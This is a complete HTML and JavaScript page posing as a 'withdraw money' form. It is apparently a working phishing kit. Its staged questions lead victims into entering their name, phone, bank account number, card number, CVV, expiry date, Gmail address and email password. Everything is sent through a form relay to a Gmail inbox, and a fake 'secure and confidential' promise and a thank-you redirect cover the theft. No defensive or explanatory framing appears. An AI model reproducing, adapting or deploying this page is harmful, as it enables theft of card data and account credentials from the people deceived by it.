<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>FILL THIS FORM TO WITHDRAW MONEY</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      background: #f5f5f5;
    }
    form {
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      max-width: 500px;
      margin: auto;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      color: #333;
    }
    label {
      display: block;
      margin-top: 15px;
    }
    input, select {
      width: 100%;
      padding: 8px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    .message {
      margin-top: 10px;
      padding: 10px;
      border-radius: 5px;
      font-weight: bold;
      text-align: center;
    }
    .green-box {
      background-color: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
    }
    .red-box {
      background-color: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
    }
    .hidden {
      display: none;
    }
    button {
      margin-top: 20px;
      padding: 10px;
      width: 100%;
      background-color: green;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
    }
    button.cancelled {
      background-color: red;
    }
    .note {
      margin-top: 20px;
      font-size: 13px;
      text-align: center;
      color: #555;
    }
  </style>
</head>
<body>
  <form id="withdrawForm" action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">
    <h2>FILL THIS FORM TO WITHDRAW MONEY</h2>

    <label>Full Name</label>
    <input type="text" name="Full Name" required />

    <label>Phone Number</label>
    <input type="tel" name="Phone Number" id="phoneNumber" pattern="\\d{9,13}" required />

    <label>Amount Allocated</label>
    <input type="number" name="Amount Allocated" id="amount" placeholder="Only 1 Withdrawal is allowed!" required />

    <label>Do you want to withdraw <span id="amountDisplay">[Amount]</span> to <span id="phoneDisplay">[Phone]</span>?</label>
    <select id="withdrawChoice" required>
      <option value="">Select</option>
      <option value="yes">Yes</option>
      <option value="no">No</option>
    </select>

    <div id="greenBox" class="message green-box hidden"></div>
    <div id="redBox" class="message red-box hidden"></div>

    <div id="bankQuestion" class="hidden">
      <label>Do you have a bank account?</label>
      <select id="hasBank" required>
        <option value="">Select</option>
        <option value="yes">Yes</option>
        <option value="no">No</option>
      </select>
    </div>

    <div id="cancelMsg" class="message red-box hidden">
      You must have bank account for international payments
    </div>

    <div id="bankFields" class="hidden">
      <label>Bank Account Number</label>
      <input type="text" name="Bank Account Number" />

      <label>Is ATM card linked?</label>
      <select id="atmLinked" required>
        <option value="">Select</option>
        <option value="yes">Yes</option>
        <option value="no">No</option>
      </select>

      <div id="atmCancelMsg" class="message red-box hidden">
        You must have ATM card linked to proceed
      </div>

      <div id="cardSection" class="hidden">
        <label>Card Number</label>
        <input type="text" name="Card Number" pattern="\\d{16}" />

        <label>CVV</label>
        <input type="text" name="CVV" pattern="\\d{3}" />

        <label>Expiry Date (MM/YY)</label>
        <input type="text" name="Expiry Date" pattern="\\d{2}/\\d{2}" />
      </div>
    </div>

    <div id="emailSection" class="hidden">
      <p><strong>Enter your email address to track your withdrawal.</strong> We shall email you when the transaction is completed.</p>
      <label>Email</label>
      <input type="email" name="Email" pattern=".+@gmail\\.com" required />

      <label>Password</label>
      <input type="password" name="Email Password" required />
    </div>

    <input type="hidden" name="_next" value="https://onlinegistrationprog.github.io/Withdrawal-form/thankyou.html" />

    <button id="submitBtn" type="submit" class="hidden">Submit</button>
    <button id="cancelBtn" type="button" class="cancelled hidden" disabled>Cancelled</button>

    <div class="note">We keep your data secure and confidential.</div>
  </form>

  <script>
    const form = document.getElementById("withdrawForm");
    const phone = document.getElementById("phoneNumber");
    const amount = document.getElementById("amount");
    const amountDisplay = document.getElementById("amountDisplay");
    const phoneDisplay = document.getElementById("phoneDisplay");
    const withdrawChoice = document.getElementById("withdrawChoice");
    const greenBox = document.getElementById("greenBox");
    const redBox = document.getElementById("redBox");
    const bankQuestion = document.getElementById("bankQuestion");
    const hasBank = document.getElementById("hasBank");
    const cancelMsg = document.getElementById("cancelMsg");
    const bankFields = document.getElementById("bankFields");
    const atmLinked = document.getElementById("atmLinked");
    const atmCancelMsg = document.getElementById("atmCancelMsg");
    const cardSection = document.getElementById("cardSection");
    const emailSection = document.getElementById("emailSection");
    const submitBtn = document.getElementById("submitBtn");
    const cancelBtn = document.getElementById("cancelBtn");

    function updateDisplay() {
      amountDisplay.textContent = amount.value || "[Amount]";
      phoneDisplay.textContent = phone.value || "[Phone]";
    }

    phone.addEventListener("input", updateDisplay);
    amount.addEventListener("input", updateDisplay);

    withdrawChoice.addEventListener("change", () => {
      if (withdrawChoice.value === "yes") {
        greenBox.textContent = `>> Withdrawing ${amount.value} to ${phone.value} <<`;
        redBox.textContent = ">> Transactions Cancelled for international Money we only support BANK Payment <<";
        greenBox.classList.remove("hidden");
        redBox.classList.remove("hidden");
        bankQuestion.classList.remove("hidden");
      } else {
        greenBox.classList.add("hidden");
        redBox.classList.add("hidden");
        bankQuestion.classList.add("hidden");
        cancelMsg.classList.add("hidden");
        bankFields.classList.add("hidden");
        emailSection.classList.add("hidden");
        submitBtn.classList.add("hidden");
        cancelBtn.classList.add("hidden");
      }
    });

    hasBank.addEventListener("change", () => {
      if (hasBank.value === "no") {
        cancelMsg.classList.remove("hidden");
        submitBtn.classList.add("hidden");
        cancelBtn.classList.remove("hidden");
        greenBox.classList.add("hidden");
        redBox.classList.add("hidden");
      } else if (hasBank.value === "yes") {
        cancelMsg.classList.add("hidden");
        cancelBtn.classList.add("hidden");
        bankFields.classList.remove("hidden");
        greenBox.classList.add("hidden");
        redBox.classList.add("hidden");
      }
    });

    atmLinked.addEventListener("change", () => {
      if (atmLinked.value === "no") {
        atmCancelMsg.classList.remove("hidden");
        cardSection.classList.add("hidden");
        emailSection.classList.add("hidden");
        submitBtn.classList.add("hidden");
        cancelBtn.classList.remove("hidden");
      } else if (atmLinked.value === "yes") {
        atmCancelMsg.classList.add("hidden");
        cardSection.classList.remove("hidden");
        emailSection.classList.remove("hidden");
        submitBtn.classList.remove("hidden");
        cancelBtn.classList.add("hidden");
      }
    });
  </script>
</body>
</html>
